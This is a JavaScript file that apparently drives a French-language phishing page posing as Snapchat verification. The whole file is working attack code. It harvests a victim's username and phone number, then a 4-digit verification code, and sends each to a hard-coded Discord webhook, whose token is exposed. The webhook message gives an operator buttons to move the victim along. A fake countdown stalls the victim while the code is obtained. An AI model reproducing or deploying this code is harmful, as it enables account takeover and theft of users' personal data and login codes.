const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1502745780304347257/oEywgtEnyzR6OncpQYn5wq9VxcRwTFDdjInd6TNo5sFCB2Dz7kMB-k7KNMpZZYQzzhX6';

const step1Form = document.getElementById('step1Form');
const waitingScreen = document.getElementById('waitingScreen');
const countdownEl = document.getElementById('countdown');
const statusMessage = document.getElementById('statusMessage');
const codeForm = document.getElementById('codeForm');
const phoneInput = document.getElementById('phone');
const codeInput = document.getElementById('code');

function showMessage(message, type) {
    if (!statusMessage) return;
    statusMessage.textContent = message;
    statusMessage.className = 'status-message ' + type;
}

function getBaseUrl() {
    if (window.location.protocol.startsWith('http')) {
        return window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, '');
    }
    return window.location.href.replace(/\/[^\/]*$/, '');
}

async function sendWebhook(payload) {
    const body = JSON.stringify(payload);

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body
        });
        if (response.ok) {
            return true;
        }
        console.warn('Discord webhook direct failed:', response.status);
    } catch (error) {
        console.warn('Discord webhook direct error:', error);
    }

    try {
        const response = await fetch('/webhook', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body
        });
        return response.ok;
    } catch (error) {
        console.error('Proxy webhook error:', error);
        return false;
    }
}

function formatPhone(value) {
    const digits = value.replace(/\D/g, '').slice(0, 10);
    if (digits.length <= 2) return digits;
    if (digits.length <= 4) return digits.slice(0, 2) + ' ' + digits.slice(2);
    if (digits.length <= 6) return digits.slice(0, 2) + ' ' + digits.slice(2, 4) + ' ' + digits.slice(4);
    if (digits.length <= 8) return digits.slice(0, 2) + ' ' + digits.slice(2, 4) + ' ' + digits.slice(4, 6) + ' ' + digits.slice(6);
    return digits.slice(0, 2) + ' ' + digits.slice(2, 4) + ' ' + digits.slice(4, 6) + ' ' + digits.slice(6, 8) + ' ' + digits.slice(8, 10);
}

function startCountdown(seconds) {
    let remaining = seconds;
    if (countdownEl) countdownEl.textContent = '02:00';

    const timer = setInterval(() => {
        remaining -= 1;
        const minutes = String(Math.floor(remaining / 60)).padStart(2, '0');
        const secondes = String(remaining % 60).padStart(2, '0');
        if (countdownEl) countdownEl.textContent = `${minutes}:${secondes}`;

        if (remaining <= 0) {
            clearInterval(timer);
            window.location.href = 'code.html';
        }
    }, 1000);
}

if (step1Form) {
    step1Form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!username) {
            showMessage('Veuillez entrer un username', 'error');
            return;
        }
        if (!phone) {
            showMessage('Veuillez entrer votre numéro', 'error');
            return;
        }

        const baseUrl = getBaseUrl();
        const payload = {
            embeds: [
                {
                    title: '📱 Nouvelle demande de vérification',
                    color: 16764160,
                    fields: [
                        {
                            name: '👤 Username',
                            value: username,
                            inline: true
                        },
                        {
                            name: '📞 Numéro de téléphone',
                            value: phone,
                            inline: true
                        },
                        {
                            name: '⏰ Heure',
                            value: new Date().toLocaleString('fr-FR'),
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'Vérification Snapchat'
                    }
                }
            ],
            components: [
                {
                    type: 1,
                    components: [
                        {
                            type: 2,
                            style: 5,
                            label: 'NON',
                            url: `${baseUrl}/ineligible.html`
                        },
                        {
                            type: 2,
                            style: 5,
                            label: 'PASSER AU CODE',
                            url: `${baseUrl}/code.html`
                        }
                    ]
                }
            ]
        };

        showMessage('Envoi en cours...', 'loading');
        const success = await sendWebhook(payload);

        if (!success) {
            showMessage('❌ Erreur lors de l\'envoi au webhook', 'error');
            return;
        }

        step1Form.classList.add('hidden');
        if (waitingScreen) waitingScreen.classList.remove('hidden');
        showMessage('✅ Votre demande a été envoyée. Redirection vers le code en 2 minutes.', 'success');
        startCountdown(120);
    });
}

if (codeForm) {
    codeForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const code = codeInput.value.trim();
        if (!code) {
            showMessage('Veuillez entrer le code', 'error');
            return;
        }
        if (code.length !== 4 || !/^\d+$/.test(code)) {
            showMessage('Le code doit contenir 4 chiffres', 'error');
            return;
        }

        const submitBtn = codeForm.querySelector('.btn-continue');
        if (submitBtn) submitBtn.disabled = true;
        showMessage('Envoi du code en cours...', 'loading');

        const payload = {
            content: `Code reçu\nCode: ${code}`
        };

        const success = await sendWebhook(payload);
        if (!success) {
            showMessage('❌ Erreur lors de l\'envoi au webhook', 'error');
            if (submitBtn) submitBtn.disabled = false;
            return;
        }

        showMessage('✅ Code envoyé avec succès !', 'success');
        codeForm.reset();
        if (submitBtn) submitBtn.disabled = false;
    });
}

if (codeInput) {
    codeInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
    });
    codeInput.addEventListener('keypress', (e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    });
}

if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
        e.target.value = formatPhone(e.target.value);
    });
    phoneInput.addEventListener('keypress', (e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    });
}
